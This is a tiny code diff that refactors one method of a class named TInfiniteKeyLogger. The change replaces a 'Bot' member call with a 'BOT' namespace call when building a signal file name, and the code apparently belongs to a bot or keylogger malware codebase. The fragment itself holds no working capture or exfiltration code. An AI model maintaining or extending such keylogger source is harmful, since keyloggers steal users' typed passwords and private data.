@@ -160,7 +160,7 @@ TInfiniteKeyLogger::~TInfiniteKeyLogger()
 //--------------------------------------------
 string TInfiniteKeyLogger::GetSignalFileName()
 {
-	return Bot->MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
+	return BOT::MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
 }
 
 
